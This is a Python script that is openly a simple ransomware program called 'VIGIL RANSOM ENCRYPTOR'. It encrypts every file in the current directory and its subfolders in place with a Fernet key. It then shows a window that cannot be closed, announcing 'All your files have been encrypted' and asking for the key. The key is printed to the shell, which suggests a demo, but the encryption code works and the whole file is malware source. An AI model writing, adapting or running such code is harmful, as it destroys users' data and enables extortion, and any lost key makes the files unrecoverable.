#!/usr/bin/python3

import os

from tkinter import *
from cryptography.fernet import Fernet


# Tracking down files

files = []
dirFiles = []

def getFiles(path, array):
    for file in os.listdir(path):

        # Uncomment these lines to track files and paths in shell

        #print(array)
        #print('Path: ', path)
        #print('File: ', file)

        if file == 'Ransom_Encrypt.py' or file =='vigil.py' or file == 'vigil.png' or file == 'vigil.sh':
            continue
        if os.path.isfile(path+'/'+file):
            array.append(file)
            #print('file-done')
        if os.path.isdir(path+'/'+file):
            array.append(file)
            #print('dir-done')
    
    print('All files found: ', array)

getFiles('.', files)

# Key generation and encryption

key = Fernet.generate_key()

for file in files:
    if os.path.isfile(file):

        with open(file, 'rb') as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, 'wb') as thefile:
            thefile.write(contents_encrypted)
    
    elif os.path.isdir(file):

        print('\nFound a Directory: ', file)
        getFiles(file, dirFiles)
        for insider in dirFiles:
            with open(file+'/'+insider, 'rb') as thefile:
                contents = thefile.read()
            contents_encrypted = Fernet(key).encrypt(contents)
            with open(file+'/'+insider, 'wb') as thefile:
                thefile.write(contents_encrypted)

print('\nKEY: ', key.decode('utf-8'))
print('\n--- All Files Have Been ENCRYPTED ---')




# Create Instruction Window

def disable_event():
   pass

def deCrypt():
    string = usr.get()
    usrKey = bytes(string, 'utf-8')
    print('\nKey entered: ', string)

    if usrKey == key:

        # Decryption process

        print('CORRECT')

        for file in files:
            if os.path.isfile(file):

                with open(file, 'rb') as thefile:
                    contents = thefile.read()
                contents_decrypted = Fernet(key).decrypt(contents)
                with open(file, 'wb') as thefile:
                    thefile.write(contents_decrypted)

            elif os.path.isdir(file):

                for insider in dirFiles:
                    with open(file+'/'+insider, 'rb') as thefile:
                        contents = thefile.read()
                    contents_decrypted = Fernet(key).decrypt(contents)
                    with open(file+'/'+insider, 'wb') as thefile:
                        thefile.write(contents_decrypted)

        print('\n--- All Files Have Been DECRYPTED ---')
        root.destroy()
    
    else:

        print('INCORRECT')

        nomatch = Label(text='Incorrect key.', font=40)
        nomatch.grid(row=6, column=0)



root = Tk()
root.title('VIGIL RANSOM ENCRYPTOR')
root.protocol("WM_DELETE_WINDOW", disable_event)
root.resizable(width=FALSE, height=FALSE)

canvas = Canvas(root, width=635, height=200)
canvas.grid(row=0, column=0)
vigil = PhotoImage(file='vigil.png')
canvas.create_image(20,20, anchor=NW, image=vigil)

prompt = Label(text='All your files have been encrypted. \nFollow instructions to receive key. \n(Key can be seen in shell)', font=40)
prompt.grid(row=1, column=0)

label = Label(text='Enter key to decrypt files: ', font=40)
label.grid(row=2, column=0)

usr = Entry(root, font=('Arial Black', 12))
usr.grid(row=4, column=0)

enter = Button(root, text='Submit', font=40, command=deCrypt)
enter.grid(row=5, column=0)

root.mainloop()
